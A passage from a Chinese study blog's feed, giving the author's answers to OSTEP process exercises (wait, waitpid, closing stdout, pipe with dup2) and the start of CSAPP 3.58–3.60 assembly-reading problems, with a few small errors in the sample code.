    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"===================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"为什么有这么多 exec() 变体？\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1. 参数传递方式的区别：\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"   - 'l' 结尾：参数作为列表传递（list）\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"   - 'v' 结尾：参数作为数组传递（vector）\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2. 程序查找方式的区别：\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"   - 'p' 结尾：在 PATH 环境变量中查找程序\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"   - 无 'p'：需要提供程序的完整路径\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3. 环境变量的处理：\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"   - 'e' 结尾：可以指定自定义环境变量\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"   - 无 'e'：继承当前进程的环境变量\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"这种设计提供了灵活性，让程序员可以根据具体需求选择\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"最合适的变体，避免不必要的复杂性。\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>解释得很清楚了</p>
<h2 id="第5题"><a href="#第5题" class="headerlink" title="第5题"></a><strong>第5题</strong></h2><blockquote>
<p>现在编写一个程序，在父进程中使用 wait()，等待子进程完成。wait()返回什么？如<br>果你谁子进程中使用 wait()会发生什么？</p>
</blockquote>
<p>写之前猜测一下：wait的返回值不会是等待的时间吧? 如果父等子，子等父，那就死锁了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">float</span> temp <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1e3</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
       temp <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">0.3</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>rc <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>rc<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>经检验，wait的返回值是子进程的pid</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>rc <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>rc<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>第二个猜测也错了，并没有死锁。其实也是合理的，wait函数的参数是 int *wstatus，一个状态，也就是说<br>wait的对象默认是子进程，而子进程没fork是没有子进程的</p>
<h2 id="第6题"><a href="#第6题" class="headerlink" title="第6题"></a><strong>第6题</strong></h2><blockquote>
<p>对前一个程序稍作修改，这次使用 waitpid()而不是 wait()。什么时候waitpid()会有用？</p>
</blockquote>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"计时%d "</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>rc <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token function">waitpid</span><span class="token punctuation">(</span>rc<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>waitpid显式指明了等的进程，如果一个父进程fork了很多次，那wait就会有歧义</p>
<p>但是个人感觉最重要的还是含义清晰</p>
<h2 id="第7题"><a href="#第7题" class="headerlink" title="第7题"></a><strong>第7题</strong></h2><blockquote>
<p>编写一个创建子进程的程序，然后在子进程中关闭标准输出（STDOUT_FILENO）。<br>如果子进程谁关闭描述符后调用 printf()打印输出，会发生什么？<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;sys/wait.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello world from child\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>rc <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello world from parent \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>输出：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hello world from parent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>只有一行</p>
</blockquote>
<h2 id="第8题"><a href="#第8题" class="headerlink" title="第8题"></a><strong>第8题</strong></h2><blockquote>
<p>编写一个程序，创建两个子进程，并使用 pipe()系统调用，将一个子进程的标准输<br>出连接到另一个子进程的标准输入。</p>
</blockquote>
<p>pipe，管道，一种IPC机制</p>
<ul>
<li>‘pipe()’，在unistd.h库中。创建一个管道，记录两个文件标识符，一端读，一端写</li>
<li>‘dup2()’，重定向标识符，接受两个文件标识符，将第二个变成第一个的副本</li>
</ul>
<p>借助一个创建的管道，用两次dup2，把两个子进程的输入输出连到一块<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> pipefd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">pipe</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// pipefd[0] - read, pipefd[1] - write</span>

    <span class="token class-name">pid_t</span> pid1 <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 子进程 A：写入者</span>
        <span class="token function">dup2</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 标准输出重定向到管道写端</span>
        <span class="token function">close</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// 关闭不用的读端</span>
        <span class="token function">close</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// 已重定向，原始描述符可关</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"abcd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//输出变成向新建的管道写入</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token class-name">pid_t</span> pid2 <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 子进程 B：读取者</span>
        <span class="token function">dup2</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 标准输入重定向到管道读端</span>
        <span class="token function">close</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// 关闭不用的写端</span>
        <span class="token function">close</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//从终端读变成了从管道写入读</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 父进程关闭两端，等待</span>
    <span class="token function">close</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>运行一下：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">abcd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>完美，注释掉第二个子进程的printf再试一下<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>什么输出也没有，所以可以确认时第二个子进程完成的输出</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第五章课后题&quot;&gt;&lt;a href=&quot;#第五章课后题&quot; class=&quot;headerlink&quot; title=&quot;第五章课后题&quot;&gt;&lt;/a&gt;第五章课后题&lt;/h1&gt;&lt;h2 id=&quot;第1题&quot;&gt;&lt;a href=&quot;#第1题&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="OSTEP" scheme="https://aucept.in/categories/OSTEP/"/>
    
    
    <category term="OSTEP" scheme="https://aucept.in/tags/OSTEP/"/>
    
    <category term="操作系统" scheme="https://aucept.in/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 3.58-3.68</title>
    <link href="https://aucept.in/2025/06/25/CSAPP-3_58-3_68/"/>
    <id>https://aucept.in/2025/06/25/CSAPP-3_58-3_68/</id>
    <published>2025-06-25T07:04:26.000Z</published>
    <updated>2025-07-02T06:58:42.905Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目-3-58"><a href="#题目-3-58" class="headerlink" title="题目 *3.58"></a>题目 *3.58</h2><blockquote>
<p>一个函数的原型为：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">decode2</span><span class="token punctuation">(</span><span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">long</span> y<span class="token punctuation">,</span> <span class="token keyword">long</span> z<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<p>GCC 产生如下汇编代码：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">decode2:
    subq    %rdx, %rsi
    imulq   %rsi, %rdi
    movq    %rsi, %rax
    salq    $63, %rax
    sarq    $63, %rax
    xorq    %rdi, %rax
    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>参数 x、y 和 z 通过寄存器 %rdi、%rsi 和 %rdx 传递。代码将返回值存放在寄存器 %rax 中。写出等价于上述汇编代码的 decode2 的 C 代码。</p>
</blockquote>
<p>不算复杂的题，逐行翻译即可，不过由于我的设备上long是4字节的,无法完成移位63的操作，需要把原型换成long long</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> y <span class="token punctuation">,</span><span class="token keyword">long</span> <span class="token keyword">long</span> z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    y <span class="token operator">-=</span> z<span class="token punctuation">;</span>
    y<span class="token operator">*=</span>x<span class="token punctuation">;</span>
    y <span class="token operator">=</span> y<span class="token operator">&lt;&lt;</span><span class="token number">63</span><span class="token punctuation">;</span>
    y <span class="token operator">=</span> y<span class="token operator">>></span><span class="token number">63</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> x or y<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>汇编后发现没有movq %rsi %rax的一步，补了一个中间变量后没变化，似乎被优化掉了，那就干脆保持原样吧</p>
<pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">subq%rdx, %rsi
imulq%rdi, %rsi
salq$63, %rsi
sarq$63, %rsi
orq%rdi, %rsi
setne%al
movzbl%al, %eax
ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对y变量只保留了最后一位，然后异或，大概是一种掩码操作</p>
<h2 id="题目-3-59"><a href="#题目-3-59" class="headerlink" title="题目 **3.59"></a>题目 **3.59</h2><blockquote>
<p>下面的代码计算两个 64 位有符号值的 128 位乘积，并将结果存在内存中：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> __int128 <span class="token class-name">int128_t</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">store_prod</span><span class="token punctuation">(</span><span class="token class-name">int128_t</span> <span class="token operator">*</span>dest<span class="token punctuation">,</span> <span class="token class-name">int64_t</span> x<span class="token punctuation">,</span> <span class="token class-name">int64_t</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token operator">*</span>dest <span class="token operator">=</span> x <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token class-name">int128_t</span><span class="token punctuation">)</span> y<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>GCC 产生下面的汇编代码来实现计算：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">store_prod:
    movq    %rdx, %rax
    cqto
    movq    %rsi, %rcx
    sarq    $63, %rcx
    imulq   %rax, %rcx
    imulq   %rsi, %rdx
    addq    %rdx, %rcx
    mulq    %rsi
    addq    %rcx, %rdx
    movq    %rax, (%rdi)
    movq    %rdx, 8(%rdi)
    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>为了满足在 64 位机器上实现 128 位运算所需的多精度计算，这段代码用了三个乘法。描述用来计算乘积的算法，对汇编代码加注释，说明它是如何实现你的算法的。</p>
<p><strong>提示：</strong> 在把参数 x 和 y 扩展到 128 位时，它们可以重写为 $x = 2^{64} \cdot x_h + x_l$ 和 $y = 2^{64} \cdot y_h + y_l$，这里 $x_h$、$x_l$、$y_h$ 和 $y_l$ 都是 64 位值。类似地，128 位的乘积可以写成 $p = 2^{64} \cdot p_h + p_l$，这里 $p_h$ 和 $p_l$ 是 64 位值。请解释这段代码是如何用 $x_h$、$x_l$、$y_h$ 和 $y_l$ 来计算 $p_h$ 和 $p_l$ 的。</p>
</blockquote>
<p>x和y都是有符号的，所以拓展到128位就是把符号位算数左移64位，其余不变。<br>默认的128位处理是把低64位放rax，高64位放rdx，但是遇到了负数补码就乱了 </p>
<script type="math/tex; mode=display">p = 2^{128} \cdot x_h y_h + 2^{64} \cdot (x_h y_l + x_l y_h) + x_l y_l</script><p>其中 $2^{128} \cdot x_h y_h$ 直接忽略</p>
<pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">store_prod:
    movq    %rdx, %rax    ; rax &#x3D; y 
    cqto                  ; 将rax符号扩展到rdx，rdx &#x3D; y_h
    movq    %rsi, %rcx    ; rcx &#x3D; x 
    sarq    $63, %rcx     ; 算术右移63位提取符号，rcx &#x3D; x_h
    imulq   %rax, %rcx    ; rcx &#x3D; y * x_h (即 y_l * x_h)
    imulq   %rsi, %rdx    ; rdx &#x3D; x * y_h (即 x_l * y_h)
    addq    %rdx, %rcx    ; rcx &#x3D; y_l * x_h + x_l * y_h
    mulq    %rsi          ; rax:rdx &#x3D; y_l * x_l (无符号乘法)
    addq    %rcx, %rdx    ; rdx +&#x3D; rcx，得到最终的高64位
    movq    %rax, (%rdi)  ; 存储低64位到dest[0]
    movq    %rdx, 8(%rdi) ; 存储高64位到dest[1]
    ret                   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>总结一下重点，cqto(Convert Quadword to Octoword)指令，直接完成四字到八字的转换，高位放在rdx里<br>如果要自己完成，移位要用算数右移，因为负数存的是补码</p>
<h2 id="题目-3-60"><a href="#题目-3-60" class="headerlink" title="题目 **3.60"></a>题目 **3.60</h2><blockquote>
<p>考虑以下的汇编代码：<br>long loop(long x, int n)<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">loop:
  movl %esi %ecx ; ecx &#x3D; n
  movl $1 %edx
  movl $0 %eax
  jmp .L2
.L3:
  movq %rdi , %r8
  andq %rdx , %r8
  org %r8 , %rax
  salq %cl , %rdx
.L2: 
  testq %rdx %rdx
  jne .L3
  req; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>以上代码是汇编以下整体形式的C代码产生的：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">loop</span><span class="token punctuation">(</span><span class="token keyword">long</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">long</span> result <span class="token operator">=</span> _____<span class="token punctuation">;</span>
  <span class="token keyword">long</span> mask<span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span>mask <span class="token operator">=</span> __ <span class="token punctuation">;</span> mask __ <span class="token punctuation">;</span> mask <span class="token operator">=</span> ___<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      result <span class="token operator">|=</span> ___<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> 
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>你的任务是填写这个C代码中缺失的部分，得到一个程序等价于产生的汇编代码。回想一下，这个函数的结果是在寄存器%rax中返回的。<br>你会发现以下工作很有帮助：检查循环之前、之中和之后的汇编代码，形成一个寄存器和程序变量之间一致的映射。</p>
<ul>
<li>A.哪个寄存器保存着程序值x、n、result和mask、</li>
